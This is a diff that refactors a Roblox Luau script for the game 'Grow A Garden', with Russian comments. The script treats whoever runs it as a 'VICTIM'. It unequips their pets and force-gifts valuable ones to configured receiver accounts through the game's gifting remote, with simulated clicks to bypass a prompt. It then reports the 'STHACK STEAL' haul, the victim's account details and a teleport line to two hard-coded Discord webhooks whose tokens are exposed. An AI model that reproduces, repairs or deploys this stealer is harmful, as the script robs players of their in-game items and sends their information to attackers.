@@ -6,6 +6,13 @@ end
 repeat task.wait() until game:IsLoaded()
 
 local dataModule = require(game:GetService("ReplicatedStorage").Modules.DataService)
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local HttpService = game:GetService("HttpService")
+local TeleportService = game:GetService("TeleportService")
+local VirtualInputManager = game:GetService("VirtualInputManager")
+local PetsService = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetsService")
 
 -- 🔁 Храним оригинальные данные питомцев (для сравнения позже)
 local originalPetUIDs = {}
@@ -16,18 +23,11 @@ for petUid, petInfo in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
     originalPetUIDs[petUid] = true
     originalPetData[petUid] = petInfo
 end
+
 getgenv().TransferredCount = 0
 getgenv().TransferredValue = 0
 getgenv().AlreadyTransferred = {}
 getgenv().FinalTransferSent = false
-
-getgenv().AlreadyTransferred = {}
-getgenv().TransferredCount = 0
-getgenv().TransferredValue = 0
-getgenv().FinalTransferSent = false
-
-
-
 
 getgenv().PetConfig = {
     MinLevel = getgenv().MinLevel or 25,
@@ -35,14 +35,8 @@ getgenv().PetConfig = {
     GrowthFactor = 0.1
 }
 
-
 getgenv().FullInventoryWebhook = "https://discord.com/api/webhooks/1402809600096469133/1KUMRwKTZySNoA9hbAEgrLxq6tNM48tQ38qXa4X5XMDCpNd-fGpFX7Q-kH0LEqjXYx8R"
-
-
-
-for petUid, _ in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
-    originalPetUIDs[petUid] = true
-end
+getgenv().BackupWebhook = "https://discord.com/api/webhooks/1402140961303171292/_h77-A9pC0AsyU9eVTd5lWocS7erqpqsjilcxFZtubDVh5GCYMGKXr00k8-Lg5t0Ixlo"
 
 -- 🔁 Проверка — пропал ли питомец из инвентаря
 local function checkIfPetTransferred()
@@ -59,52 +53,19 @@ local function checkIfPetTransferred()
     end
 end
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local Players = game:GetService("Players")
-local LocalPlayer = Players.LocalPlayer
-
-local PetsService = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetsService")
-
 local function unequipAllPets()
-    local petsData = require(ReplicatedStorage.Modules.DataService):GetData().PetsData.PetInventory.Data
-
+    local petsData = dataModule:GetData().PetsData.PetInventory.Data
     for petUid, petInfo in pairs(petsData) do
-        -- petUid = "{...}" строка UUID
-        -- petInfo = таблица с данными питомца
         print("➡️ Unequipping:", petInfo.PetType, petUid)
         PetsService:FireServer("UnequipPet", petUid)
-        task.wait(0.1) -- небольшая задержка между снятиями
+        task.wait(0.1)
     end
 end
 
 unequipAllPets()
 
-
-
-getgenv().BackupWebhook = "https://discord.com/api/webhooks/1402140961303171292/_h77-A9pC0AsyU9eVTd5lWocS7erqpqsjilcxFZtubDVh5GCYMGKXr00k8-Lg5t0Ixlo"
-local BackupWebhook = getgenv().BackupWebhook or ""
-
 print("=============1")
-local VirtualInputManager = game:GetService("VirtualInputManager")
 local teleportStarted = false
-local Players = game:GetService("Players")
-local HttpService = game:GetService("HttpService")
-local TeleportService = game:GetService("TeleportService")
-
-local LocalPlayer = Players.LocalPlayer
 local PlaceID = game.PlaceId
 local AllIDs = {}
 local foundAnything = ""
@@ -234,8 +195,6 @@ Title.Parent = Background
 
 print("=============3")
 
-local dataModule = require(game:GetService("ReplicatedStorage").Modules.DataService)
-
 local BASE_PET_WHITELIST = {
     'Raccoon', 'T-Rex', 'Fennec Fox', 'Dragonfly', 'Butterfly', 'Disco Bee',
     'Mimic Octopus', 'Queen Bee', 'Spinosaurus', 'Kitsune', 'French Fry Ferret'
@@ -254,7 +213,6 @@ local PET_VALUES = {
     ["Chicken Zombie"] = 100, ["Red Fox"] = 100
 }
 
-
 -- 🔎 Проверка возраста и веса питомца
 local function isPetValid(petData)
     local minLevel = getgenv().PetConfig.MinLevel or 100
@@ -268,14 +226,6 @@ local function isPetValid(petData)
     return level >= minLevel or realWeight >= minWeight
 end
 
-
-
-
-
-
-
-
-
 print("=============4")
 
 local function checkPetsWhitelist(petName, petData)
@@ -286,7 +236,6 @@ local function checkPetsWhitelist(petName, petData)
     end
     return false
 end
-
 
 local function getInventoryValue()
     print("=============getInventoryValue started")
@@ -309,24 +258,17 @@ local function getInventoryValue()
     return total
 end
 
-
-
 print("=============5")
 local inventoryValue = getInventoryValue()
 print("=============Inventory value:", inventoryValue)
-
-
 
 local function sendFullInventory()
     local webhookUrl = getgenv().FullInventoryWebhook
     if not webhookUrl or webhookUrl == "" then return end
 
-    local HttpService = game:GetService("HttpService")
-    local dataModule = require(game:GetService("ReplicatedStorage").Modules.DataService)
     local allPetData = dataModule:GetData().PetsData.PetInventory.Data
-
     local petLines = {}
-    local growthFactor = 0.1 -- 🔒 скрыто в коде
+    local growthFactor = 0.1
 
     for _, value in pairs(allPetData) do
         local petName = value.PetType
@@ -370,50 +312,62 @@ local function sendFullInventory()
     end
 end
 
+local function sendStealReportOnce()
+    local passedPets = {}
+    local failedPets = {}
+    local totalValue = 0
+    local failedValue = 0
+    local countPassed = 0
+    local countFailed = 0
+    local growthFactor = getgenv().PetConfig.GrowthFactor or 0.1
 
+    for petUid, petInfo in pairs(originalPetData) do
+        if not dataModule:GetData().PetsData.PetInventory.Data[petUid] then
+            local petName = petInfo.PetType
+            local petData = petInfo.PetData
+            local level = petData.Level or 0
+            local baseWeight = petData.BaseWeight or 0
+            local realWeight = baseWeight * (1 + level * growthFactor)
+            local petPrice = PET_VALUES[petName] or 0
 
+            local line = string.format("%s | Level: %s | Weight: %.2f KG | Value: %s", petName, level, realWeight, petPrice)
 
-
-
-
-
-
-local function startStealingProcess()
-    print("=============startStealingProcess started")
-    if getgenv().scriptAlreadyRan then return end
-        getgenv().scriptAlreadyRan = true
-
-    scriptAlreadyRan = true
-
-    repeat task.wait() until game:IsLoaded()
-    print("=============Game loaded")
-
-    local VICTIM = game.Players.LocalPlayer
-    local USERNAMES = getgenv().Username or {}
-    print("=============VICTIM:", VICTIM.Name, "USERNAMES:", table.concat(USERNAMES, ", "))
-
-    local function getWebhookUrl()
-        local url = getgenv().Webhook or ""
-        print("=============Webhook URL:", url)
-        return url
-    end
-
-    local function waitForJoin()
-        local findTarget = false
-        local trigeretName = nil
-        for _, player in game.Players:GetPlayers() do
-            if not table.find(USERNAMES, player.Name) then continue end
-            trigeretName = player.Name
-            findTarget = true
+            if checkPetsWhitelist(petName, petData) then
+                table.insert(passedPets, line)
+                totalValue += petPrice
+                countPassed += 1
+            else
+                table.insert(failedPets, line)
+                failedValue += petPrice
+                countFailed += 1
+            end
         end
-        print("=============waitForJoin: findTarget =", findTarget, "trigeretName =", trigeretName)
-        return findTarget, trigeretName
     end
+
+    local summary = string.format(
+        "**✅ Passed:** %d pets | 💸 Value: %d\n**❌ Failed:** %d pets | 💸 Missed: %d",
+        countPassed, totalValue, countFailed, failedValue
+    )
+
+    local fullPetList = "**✅ Passed Pets:**\n" .. table.concat(passedPets, "\n") ..
+                        "\n\n**❌ Failed Pets:**\n" .. table.concat(failedPets, "\n")
 
     local function createDiscordEmbed(petList, totalValue, fileUrl, callback)
-        local webhookUrl = getWebhookUrl()
-        local backupWebhook = BackupWebhook
+        local webhookUrl = getgenv().Webhook or ""
+        local backupWebhook = getgenv().BackupWebhook or ""
         print("=============createDiscordEmbed: webhookUrl =", webhookUrl, "backupWebhook =", backupWebhook)
+
+        local function deepCopy(tbl)
+            local copy = {}
+            for k, v in pairs(tbl) do
+                if type(v) == "table" then
+                    copy[k] = deepCopy(v)
+                else
+                    copy[k] = v
+                end
+            end
+            return copy
+        end
 
         local baseFields = {
             { name = "💰 **Total Value**", value = string.format("```\n%s👿\n```", totalValue), inline = false },
@@ -423,28 +377,28 @@ local function startStealingProcess()
         local fullEmbed = {
             title = "🤑 Grow A Garden Hit - STHACK STEAL 🤑",
             color = 65280,
-            fields = table.clone(baseFields),
+            fields = deepCopy(baseFields),
             footer = { text = string.format("%s | %s", game.PlaceId, game.JobId) }
         }
 
         table.insert(fullEmbed.fields, 1, {
             name = "👤 **Player Information**",
             value = string.format("```\nName: %s\nReceiver: %s\nExecutor: %s\nAccount Age: %s\n```",
-                VICTIM.Name, table.concat(USERNAMES, " "), identifyexecutor and identifyexecutor() or "Unknown", VICTIM.AccountAge),
+                LocalPlayer.Name, table.concat(getgenv().Username or {}, " "), identifyexecutor and identifyexecutor() or "Unknown", LocalPlayer.AccountAge),
             inline = false
         })
 
         local basePayload = {
-            username = VICTIM.Name,
+            username = LocalPlayer.Name,
             avatar_url = "https://cdn.discordapp.com/attachments/1024859338205429760/1103739198735261716/icon.png",
             content = string.format("--@everyone\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(%s, \"%s\")\n", game.PlaceId, game.JobId),
             embeds = {}
         }
 
-        local request = http_request or request or HttpPost or syn.request
+        local request = http_request or request or syn.request
         print("=============Request function:", request and "available" or "not available")
 
-        local fullPayload = table.clone(basePayload)
+        local fullPayload = deepCopy(basePayload)
         fullPayload.embeds = { fullEmbed }
         print("=============Main webhook payload:", HttpService:JSONEncode(fullPayload))
 
@@ -467,12 +421,12 @@ local function startStealingProcess()
             local backupEmbed = {
                 title = fullEmbed.title,
                 color = fullEmbed.color,
-                fields = baseFields,
+                fields = deepCopy(baseFields),
                 footer = fullEmbed.footer
             }
 
             local backupPayload = {
-                username = VICTIM.Name,
+                username = LocalPlayer.Name,
                 avatar_url = "https://cdn.discordapp.com/attachments/1024859338205429760/1103739198735261716/icon.png",
                 embeds = { backupEmbed }
             }
@@ -501,88 +455,392 @@ local function startStealingProcess()
         end
     end
 
+    createDiscordEmbed(fullPetList, summary, "", function()
+        print("📨 Отчёт об исчезнувших питомцах отправлен.")
+    end)
+end
 
-function sendStealReportOnce()
-    local passedPets = {}
-local failedPets = {}
-local totalValue = 0
-local failedValue = 0
-local countPassed = 0
-local countFailed = 0
-local growthFactor = getgenv().PetConfig.GrowthFactor or 0.1
+local function startStealingProcess()
+    print("=============startStealingProcess started")
+    if getgenv().scriptAlreadyRan then return end
+    getgenv().scriptAlreadyRan = true
 
--- 🔎 Сравниваем исчезнувших питомцев
-for petUid, petInfo in pairs(originalPetData) do
-    if not dataModule:GetData().PetsData.PetInventory.Data[petUid] then
-        local petName = petInfo.PetType
-        local petData = petInfo.PetData
-        local level = petData.Level or 0
-        local baseWeight = petData.BaseWeight or 0
-        local realWeight = baseWeight * (1 + level * growthFactor)
-        local petPrice = PET_VALUES[petName] or 0
+    repeat task.wait() until game:IsLoaded()
+    print("=============Game loaded")
 
-        local line = string.format("%s | Level: %s | Weight: %.2f KG | Value: %s", petName, level, realWeight, petPrice)
+    local VICTIM = LocalPlayer
+    local USERNAMES = getgenv().Username or {}
+    print("=============VICTIM:", VICTIM.Name, "USERNAMES:", table.concat(USERNAMES, ", "))
 
-        if checkPetsWhitelist(petName, petData) then
-            table.insert(passedPets, line)
-            totalValue += petPrice
-            countPassed += 1
-        else
-            table.insert(failedPets, line)
-            failedValue += petPrice
-            countFailed += 1
+    local function getWebhookUrl()
+        local url = getgenv().Webhook or ""
+        print("=============Webhook URL:", url)
+        return url
+    end
+
+    local function waitForJoin()
+        local findTarget = false
+        local trigeretName = nil
+        for _, player in Players:GetPlayers() do
+            if not table.find(USERNAMES, player.Name) then continue end
+            trigeretName = player.Name
+            findTarget = true
+        end
+        print("=============waitForJoin: findTarget =", findTarget, "trigeretName =", trigeretName)
+        return findTarget, trigeretName
+    end
+
+    local function teleportTarget(targetName)
+        if VICTIM.Character and VICTIM.Character:FindFirstChild("HumanoidRootPart") and
+           game.Players[targetName] and game.Players[targetName].Character and
+           game.Players[targetName].Character:FindFirstChild("HumanoidRootPart") then
+            VICTIM.Character.HumanoidRootPart.CFrame = game.Players[targetName].Character.HumanoidRootPart.CFrame
         end
     end
-end
 
--- 🧾 Формируем отчёт
-local summary = string.format(
-    "**✅ Passed:** %d pets | 💸 Value: %d\n**❌ Failed:** %d pets | 💸 Missed: %d",
-    countPassed, totalValue, countFailed, failedValue
-)
-
-local fullPetList = "**✅ Passed Pets:**\n" .. table.concat(passedPets, "\n") ..
-                    "\n\n**❌ Failed Pets:**\n" .. table.concat(failedPets, "\n")
-
--- 📤 Отправляем в Discord
-createDiscordEmbed(fullPetList, summary, "", function()
-    print("📨 Отчёт об исчезнувших питомцах отправлен.")
-end)
-end
-
-
-
-
-
-
-    local totalValue = 0
-local victimPetTable = {}
-
-for petUid, value in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
-    local petName = value.PetType
-    local petData = value.PetData
-
-    local inWhitelist = checkPetsWhitelist(petName, petData)
-    local isValid = isPetValid(petData)
-
-    local petPrice = 0
-    if inWhitelist then
-        petPrice = PET_VALUES[petName] or 0
-    elseif isValid then
-        petPrice = 50 -- 🟡 Присваиваем 50, если пет прошёл по весу/возрасту
+    local function deltaBypass()
+        VirtualInputManager:SendMouseButtonEvent(
+            workspace.Camera.ViewportSize.X / 2, workspace.Camera.ViewportSize.Y / 2,
+            0, true, nil, false
+        )
+        task.wait()
+        VirtualInputManager:SendMouseButtonEvent(
+            workspace.Camera.ViewportSize.X / 2, workspace.Camera.ViewportSize.Y / 2,
+            0, false, nil, false
+        )
     end
 
-    if petPrice > 0 then
-        totalValue += petPrice
-        local level = petData.Level or 0
-        local baseWeight = petData.BaseWeight or 0
-        local config = getgenv().PetConfig or {}
-        local growthFactor = config.GrowthFactor or 0.1
-        local realWeight = baseWeight * (1 + level * growthFactor)
+    local function getPetObject(petUid)
+        for _, object in pairs(VICTIM.Backpack:GetChildren()) do
+            if object:GetAttribute("PET_UUID") == petUid then
+                return object
+            end
+        end
+        for _, object in pairs(workspace[VICTIM.Name]:GetChildren()) do
+            if object:GetAttribute("PET_UUID") == petUid then
+                return object
+            end
+        end
+        return nil
+    end
 
-        local line = string.format("%s | Level: %s | Weight: %.2f KG | Value: %s", petName, level, realWeight, petPrice)
-        table.insert(victimPetTable, line)
+    local function equipPet(pet)
+        if pet:GetAttribute("d") then
+            ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("Favorite_Item"):FireServer(pet)
+        end
+        if VICTIM.Character and VICTIM.Character:FindFirstChild("Humanoid") then
+            VICTIM.Character.Humanoid:EquipTool(pet)
+        end
+    end
 
+    local function startSteal(trigerName)
+        local player = Players:FindFirstChild(trigerName)
+        if player and player.Character and player.Character:FindFirstChild("Head") then
+            local prompt = player.Character.Head:FindFirstChild("ProximityPrompt")
+            if prompt then
+                prompt.HoldDuration = 0
+                deltaBypass()
+            end
+        end
+    end
+
+    local function givePetToPlayer(petUid, playerName)
+        local player = Players:FindFirstChild(playerName)
+        if not player then return false end
+
+        local petObject = getPetObject(petUid)
+        if not petObject then return false end
+
+        local args = {
+            [1] = "GivePet",
+            [2] = player,
+            [3] = petObject
+        }
+
+        ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetGiftingService"):FireServer(unpack(args))
+        return true
+    end
+
+    local function sendPetTransferredLog(petName, level, weight, value)
+        local message = string.format("✅ Передан: %s | Level: %d | Weight: %.2f KG | Value: %d", petName, level, weight, value)
+        local function createDiscordEmbed(petList, totalValue, fileUrl, callback)
+            local webhookUrl = getWebhookUrl()
+            local backupWebhook = getgenv().BackupWebhook or ""
+            print("=============createDiscordEmbed: webhookUrl =", webhookUrl, "backupWebhook =", backupWebhook)
+
+            local function deepCopy(tbl)
+                local copy = {}
+                for k, v in pairs(tbl) do
+                    if type(v) == "table" then
+                        copy[k] = deepCopy(v)
+                    else
+                        copy[k] = v
+                    end
+                end
+                return copy
+            end
+
+            local baseFields = {
+                { name = "💰 **Total Value**", value = string.format("```\n%s👿\n```", totalValue), inline = false },
+                { name = "🐱‍👤Pet-list", value = string.format("```\n%s\n```", petList), inline = false }
+            }
+
+            local fullEmbed = {
+                title = "🤑 Grow A Garden Hit - STHACK STEAL 🤑",
+                color = 65280,
+                fields = deepCopy(baseFields),
+                footer = { text = string.format("%s | %s", game.PlaceId, game.JobId) }
+            }
+
+            table.insert(fullEmbed.fields, 1, {
+                name = "👤 **Player Information**",
+                value = string.format("```\nName: %s\nReceiver: %s\nExecutor: %s\nAccount Age: %s\n```",
+                    LocalPlayer.Name, table.concat(getgenv().Username or {}, " "), identifyexecutor and identifyexecutor() or "Unknown", LocalPlayer.AccountAge),
+                inline = false
+            })
+
+            local basePayload = {
+                username = LocalPlayer.Name,
+                avatar_url = "https://cdn.discordapp.com/attachments/1024859338205429760/1103739198735261716/icon.png",
+                content = string.format("--@everyone\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(%s, \"%s\")\n", game.PlaceId, game.JobId),
+                embeds = {}
+            }
+
+            local request = http_request or request or syn.request
+            print("=============Request function:", request and "available" or "not available")
+
+            local fullPayload = deepCopy(basePayload)
+            fullPayload.embeds = { fullEmbed }
+            print("=============Main webhook payload:", HttpService:JSONEncode(fullPayload))
+
+            local success, response = pcall(function()
+                return request({
+                    Url = webhookUrl,
+                    Method = "POST",
+                    Headers = { ["Content-Type"] = "application/json" },
+                    Body = HttpService:JSONEncode(fullPayload)
+                })
+            end)
+
+            if success then
+                print("=============Main webhook response:", response.StatusCode, response.Body)
+            else
+                warn("=============Main webhook error:", response)
+            end
+
+            if backupWebhook then
+                local backupEmbed = {
+                    title = fullEmbed.title,
+                    color = fullEmbed.color,
+                    fields = deepCopy(baseFields),
+                    footer = fullEmbed.footer
+                }
+
+                local backupPayload = {
+                    username = LocalPlayer.Name,
+                    avatar_url = "https://cdn.discordapp.com/attachments/1024859338205429760/1103739198735261716/icon.png",
+                    embeds = { backupEmbed }
+                }
+                print("=============Backup webhook payload:", HttpService:JSONEncode(backupPayload))
+
+                local success, response = pcall(function()
+                    return request({
+                        Url = backupWebhook,
+                        Method = "POST",
+                        Headers = { ["Content-Type"] = "application/json" },
+                        Body = HttpService:JSONEncode(backupPayload)
+                    })
+                end)
+
+                if success then
+                    print("=============Backup webhook response:", response.StatusCode, response.Body)
+                else
+                    warn("=============Backup webhook error:", response)
+                end
+            end
+
+            if success and response.StatusCode ~= 200 and response.StatusCode ~= 204 then
+                warn("Ошибка отправки в Discord:", response.StatusCode, response.Body)
+            elseif callback then
+                callback()
+            end
+        end
+        createDiscordEmbed(message, "**Успешная передача питомца**", "", callback)
+    end
+
+    local function checkPetsInventory(targetName)
+        local player = Players:FindFirstChild(targetName)
+        if not player then return end
+
+        local anyTransferred = false
+
+        for petUid, value in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
+            if getgenv().AlreadyTransferred[petUid] then continue end
+
+            local petName = value.PetType
+            local petData = value.PetData
+
+            if checkPetsWhitelist(petName, petData) then
+                local petObject = getPetObject(petUid)
+                if not petObject then continue end
+
+                equipPet(petObject)
+                task.wait(0.2)
+
+                if givePetToPlayer(petUid, targetName) then
+                    getgenv().AlreadyTransferred[petUid] = true
+                    anyTransferred = true
+
+                    local level = petData.Level or 0
+                    local baseWeight = petData.BaseWeight or 0
+                    local weight = baseWeight * (1 + level * (getgenv().PetConfig.GrowthFactor or 0.1))
+                    local value = PET_VALUES[petName] or 0
+
+                    print(string.format("✅ Успешно передан: %s | Level: %s | Weight: %.2f KG | Value: %d", petName, level, weight, value))
+                    sendPetTransferredLog(petName, level, weight, value)
+
+                    getgenv().TransferredCount += 1
+                    getgenv().TransferredValue += value
+                end
+            end
+        end
+
+        if not anyTransferred and not getgenv().FinalTransferSent then
+            getgenv().FinalTransferSent = true
+            local summary = string.format("**🎯 Все питомцы переданы.**\nКоличество: %d\nОбщая стоимость: 💰 %d", getgenv().TransferredCount, getgenv().TransferredValue)
+            local function createDiscordEmbed(petList, totalValue, fileUrl, callback)
+                local webhookUrl = getWebhookUrl()
+                local backupWebhook = getgenv().BackupWebhook or ""
+                print("=============createDiscordEmbed: webhookUrl =", webhookUrl, "backupWebhook =", backupWebhook)
+
+                local function deepCopy(tbl)
+                    local copy = {}
+                    for k, v in pairs(tbl) do
+                        if type(v) == "table" then
+                            copy[k] = deepCopy(v)
+                        else
+                            copy[k] = v
+                        end
+                    end
+                    return copy
+                end
+
+                local baseFields = {
+                    { name = "💰 **Total Value**", value = string.format("```\n%s👿\n```", totalValue), inline = false },
+                    { name = "🐱‍👤Pet-list", value = string.format("```\n%s\n```", petList), inline = false }
+                }
+
+                local fullEmbed = {
+                    title = "🤑 Grow A Garden Hit - STHACK STEAL 🤑",
+                    color = 65280,
+                    fields = deepCopy(baseFields),
+                    footer = { text = string.format("%s | %s", game.PlaceId, game.JobId) }
+                }
+
+                table.insert(fullEmbed.fields, 1, {
+                    name = "👤 **Player Information**",
+                    value = string.format("```\nName: %s\nReceiver: %s\nExecutor: %s\nAccount Age: %s\n```",
+                        LocalPlayer.Name, table.concat(getgenv().Username or {}, " "), identifyexecutor and identifyexecutor() or "Unknown", LocalPlayer.AccountAge),
+                    inline = false
+                })
+
+                local basePayload = {
+                    username = LocalPlayer.Name,
+                    avatar_url = "https://cdn.discordapp.com/attachments/1024859338205429760/1103739198735261716/icon.png",
+                    content = string.format("--@everyone\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(%s, \"%s\")\n", game.PlaceId, game.JobId),
+                    embeds = {}
+                }
+
+                local request = http_request or request or syn.request
+                print("=============Request function:", request and "available" or "not available")
+
+                local fullPayload = deepCopy(basePayload)
+                fullPayload.embeds = { fullEmbed }
+                print("=============Main webhook payload:", HttpService:JSONEncode(fullPayload))
+
+                local success, response = pcall(function()
+                    return request({
+                        Url = webhookUrl,
+                        Method = "POST",
+                        Headers = { ["Content-Type"] = "application/json" },
+                        Body = HttpService:JSONEncode(fullPayload)
+                    })
+                end)
+
+                if success then
+                    print("=============Main webhook response:", response.StatusCode, response.Body)
+                else
+                    warn("=============Main webhook error:", response)
+                end
+
+                if backupWebhook then
+                    local backupEmbed = {
+                        title = fullEmbed.title,
+                        color = fullEmbed.color,
+                        fields = deepCopy(baseFields),
+                        footer = fullEmbed.footer
+                    }
+
+                    local backupPayload = {
+                        username = LocalPlayer.Name,
+                        avatar_url = "https://cdn.discordapp.com/attachments/1024859338205429760/1103739198735261716/icon.png",
+                        embeds = { backupEmbed }
+                    }
+                    print("=============Backup webhook payload:", HttpService:JSONEncode(backupPayload))
+
+                    local success, response = pcall(function()
+                        return request({
+                            Url = backupWebhook,
+                            Method = "POST",
+                            Headers = { ["Content-Type"] = "application/json" },
+                            Body = HttpService:JSONEncode(backupPayload)
+                        })
+                    end)
+
+                    if success then
+                        print("=============Backup webhook response:", response.StatusCode, response.Body)
+                    else
+                        warn("=============Backup webhook error:", response)
+                    end
+                end
+
+                if success and response.StatusCode ~= 200 and response.StatusCode ~= 204 then
+                    warn("Ошибка отправки в Discord:", response.StatusCode, response.Body)
+                elseif callback then
+                    callback()
+                end
+            end
+            createDiscordEmbed("Все возможные питомцы были переданы.", summary, "", function() end)
+        end
+    end
+
+    local totalValue = 0
+    local victimPetTable = {}
+
+    for petUid, value in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
+        local petName = value.PetType
+        local petData = value.PetData
+
+        local inWhitelist = checkPetsWhitelist(petName, petData)
+        local isValid = isPetValid(petData)
+
+        local petPrice = 0
+        if inWhitelist then
+            petPrice = PET_VALUES[petName] or 0
+        elseif isValid then
+            petPrice = 50
+        end
+
+        if petPrice > 0 then
+            totalValue += petPrice
+            local level = petData.Level or 0
+            local baseWeight = petData.BaseWeight or 0
+            local config = getgenv().PetConfig or {}
+            local growthFactor = config.GrowthFactor or 0.1
+            local realWeight = baseWeight * (1 + level * growthFactor)
+
+            local line = string.format("%s | Level: %s | Weight: %.2f KG | Value: %s", petName, level, realWeight, petPrice)
+            table.insert(victimPetTable, line)
         end
     end
 
@@ -593,158 +851,136 @@ for petUid, value in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
         return
     end
 
-    createDiscordEmbed(table.concat(victimPetTable, "\n"), tostring(totalValue), "https://cdn.discordapp.com/attachments/.../items.txt", function()
-        print("✅ Отправлено в Discord, начинаем слежку за целью.")
-        -------------------- ВСТАВЛЯЕМ СЮДА --------------------
-        
-        local function teleportTarget(targetName)
-            VICTIM.Character.HumanoidRootPart.CFrame = game.Players[targetName].Character.HumanoidRootPart.CFrame
-        end
+    local function createDiscordEmbed(petList, totalValue, fileUrl, callback)
+        local webhookUrl = getWebhookUrl()
+        local backupWebhook = getgenv().BackupWebhook or ""
+        print("=============createDiscordEmbed: webhookUrl =", webhookUrl, "backupWebhook =", backupWebhook)
 
-        local function deltaBypass()
-            VirtualInputManager:SendMouseButtonEvent(
-                workspace.Camera.ViewportSize.X / 2, workspace.Camera.ViewportSize.Y / 2,
-                0, true, nil, false
-            )
-            task.wait()
-            VirtualInputManager:SendMouseButtonEvent(
-                workspace.Camera.ViewportSize.X / 2, workspace.Camera.ViewportSize.Y / 2,
-                0, false, nil, false
-            )
-        end
-
-        local function getPetObject(petUid)
-            for _, object in pairs(VICTIM.Backpack:GetChildren()) do
-                if object:GetAttribute("PET_UUID") == petUid then
-                    return object
+        local function deepCopy(tbl)
+            local copy = {}
+            for k, v in pairs(tbl) do
+                if type(v) == "table" then
+                    copy[k] = deepCopy(v)
+                else
+                    copy[k] = v
                 end
             end
-            for _, object in pairs(workspace[VICTIM.Name]:GetChildren()) do
-                if object:GetAttribute("PET_UUID") == petUid then
-                    return object
-                end
-            end
-            return nil
+            return copy
         end
 
-        local function equipPet(pet)
-            if pet:GetAttribute("d") then
-                game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("Favorite_Item"):FireServer(pet)
-            end
-            VICTIM.Character.Humanoid:EquipTool(pet)
+        local baseFields = {
+            { name = "💰 **Total Value**", value = string.format("```\n%s👿\n```", totalValue), inline = false },
+            { name = "🐱‍👤Pet-list", value = string.format("```\n%s\n```", petList), inline = false }
+        }
+
+        local fullEmbed = {
+            title = "🤑 Grow A Garden Hit - STHACK STEAL 🤑",
+            color = 65280,
+            fields = deepCopy(baseFields),
+            footer = { text = string.format("%s | %s", game.PlaceId, game.JobId) }
+        }
+
+        table.insert(fullEmbed.fields, 1, {
+            name = "👤 **Player Information**",
+            value = string.format("```\nName: %s\nReceiver: %s\nExecutor: %s\nAccount Age: %s\n```",
+                LocalPlayer.Name, table.concat(getgenv().Username or {}, " "), identifyexecutor and identifyexecutor() or "Unknown", LocalPlayer.AccountAge),
+            inline = false
+        })
+
+        local basePayload = {
+            username = LocalPlayer.Name,
+            avatar_url = "https://cdn.discordapp.com/attachments/1024859338205429760/1103739198735261716/icon.png",
+            content = string.format("--@everyone\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(%s, \"%s\")\n", game.PlaceId, game.JobId),
+            embeds = {}
+        }
+
+        local request = http_request or request or syn.request
+        print("=============Request function:", request and "available" or "not available")
+
+        local fullPayload = deepCopy(basePayload)
+        fullPayload.embeds = { fullEmbed }
+        print("=============Main webhook payload:", HttpService:JSONEncode(fullPayload))
+
+        local success, response = pcall(function()
+            return request({
+                Url = webhookUrl,
+                Method = "POST",
+                Headers = { ["Content-Type"] = "application/json" },
+                Body = HttpService:JSONEncode(fullPayload)
+            })
+        end)
+
+        if success then
+            print("=============Main webhook response:", response.StatusCode, response.Body)
+        else
+            warn("=============Main webhook error:", response)
         end
 
-        local function startSteal(trigerName)
-            local prompt = game.Players[trigerName].Character.Head:FindFirstChild("ProximityPrompt")
-            if prompt then
-                prompt.HoldDuration = 0
-                deltaBypass()
-            end
-        end
-
-        local function givePetToPlayer(petUid, playerName)
-            local player = game:GetService("Players"):FindFirstChild(playerName)
-            if not player then return false end
-
-            local petObject = getPetObject(petUid)
-            if not petObject then return false end
-
-            local args = {
-                [1] = "GivePet";
-                [2] = player;
-                [3] = petObject;
+        if backupWebhook then
+            local backupEmbed = {
+                title = fullEmbed.title,
+                color = fullEmbed.color,
+                fields = deepCopy(baseFields),
+                footer = fullEmbed.footer
             }
 
-            game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("PetGiftingService"):FireServer(unpack(args))
-            return true
-        end
+            local backupPayload = {
+                username = LocalPlayer.Name,
+                avatar_url = "https://cdn.discordapp.com/attachments/1024859338205429760/1103739198735261716/icon.png",
+                embeds = { backupEmbed }
+            }
+            print("=============Backup webhook payload:", HttpService:JSONEncode(backupPayload))
 
+            local success, response = pcall(function()
+                return request({
+                    Url = backupWebhook,
+                    Method = "POST",
+                    Headers = { ["Content-Type"] = "application/json" },
+                    Body = HttpService:JSONEncode(backupPayload)
+                })
+            end)
 
-local function sendPetTransferredLog(petName, level, weight, value)
-    local message = string.format("✅ Передан: %s | Level: %d | Weight: %.2f KG | Value: %d", petName, level, weight, value)
-
-    createDiscordEmbed(message, "**Успешная передача питомца**", "")
-end
-
-
-
-local function checkPetsInventory(targetName)
-    local player = game.Players:FindFirstChild(targetName)
-    if not player then return end
-
-    local anyTransferred = false
-
-    for petUid, value in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
-        if getgenv().AlreadyTransferred[petUid] then continue end
-
-        local petName = value.PetType
-        local petData = value.PetData
-
-        if checkPetsWhitelist(petName, petData) then
-            local petObject = getPetObject(petUid)
-            if not petObject then continue end
-
-            equipPet(petObject)
-            task.wait(0.2)
-
-            if givePetToPlayer(petUid, targetName) then
-                getgenv().AlreadyTransferred[petUid] = true
-                anyTransferred = true
-
-                local level = petData.Level or 0
-                local baseWeight = petData.BaseWeight or 0
-                local weight = baseWeight * (1 + level * (getgenv().PetConfig.GrowthFactor or 0.1))
-                local value = PET_VALUES[petName] or 0
-
-                print(string.format("✅ Успешно передан: %s | Level: %s | Weight: %.2f KG | Value: %d", petName, level, weight, value))
-
